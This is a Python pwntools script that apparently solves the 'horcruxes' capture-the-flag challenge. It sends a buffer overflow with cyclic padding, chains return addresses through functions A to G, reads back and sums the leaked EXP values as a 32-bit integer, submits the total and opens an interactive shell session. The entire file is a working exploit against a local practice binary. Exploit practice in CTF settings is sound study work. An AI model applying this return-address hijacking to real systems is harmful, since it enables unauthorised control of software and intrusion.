#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from ctypes import c_int32
context.binary = "./horcruxes"
#  context.log_level = "debug"
#  context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

io = process("./horcruxes")
elf = ELF("./horcruxes")
io.sendlineafter(":", "0")

#  gdb.attach(io, "b *0x80A0176\nc")
io.sendlineafter(" : ", flat([cyclic(0x74 + 4), elf.sym['A'], elf.sym['B'], elf.sym['C'], elf.sym['D'], elf.sym['E'], elf.sym['F'], elf.sym['G'], 0x809FFF9]))

exp = 0
for i in xrange(7):
    io.recvuntil("EXP +")
    exp += int(io.recvuntil(")\n", drop = True))

io.sendlineafter(":", "0")
io.sendlineafter(" : ", str(c_int32(exp).value))
io.interactive()
